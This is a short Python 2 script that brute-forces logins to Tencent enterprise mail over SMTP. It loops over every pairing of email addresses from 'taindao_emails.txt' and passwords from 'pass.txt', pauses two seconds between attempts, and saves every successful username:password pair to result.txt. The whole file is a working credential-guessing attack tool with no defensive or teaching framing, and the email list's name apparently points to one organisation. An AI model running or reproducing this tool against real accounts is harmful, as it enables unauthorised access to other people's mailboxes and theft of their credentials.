#!/usr/bin/env
# -*- coding: utf-8 -*-

import smtplib
import time

smtp_host='smtp.exmail.qq.com'
smtp_port='465'

class mail_login():

	def __init__(self,loginname,loginpass):
		self._loginname=loginname
		self._loginpass=loginpass


	def login(self):
		smtp=smtplib.SMTP_SSL(smtp_host,smtp_port)
		try:
			smtp.login(self._loginname,self._loginpass)
			print '%s:%s-----------login success'%(self._loginname,self._loginpass)
			result=self._loginname+':'+self._loginpass+'\n'
			open('result.txt','a').write(result)
		except smtplib.SMTPAuthenticationError,e:
			print '%s:%s-----------login fail'%(self._loginname,self._loginpass)
		except smtplib.SMTPException,e:
			print e
		time.sleep(2)



loginname_list=[x.strip() for x in open('taindao_emails.txt')]
password_list=[x.strip() for x in open('pass.txt')]
for name in loginname_list:
	for password in password_list:
		#print name,password
		m=mail_login(name,password)
		m.login()

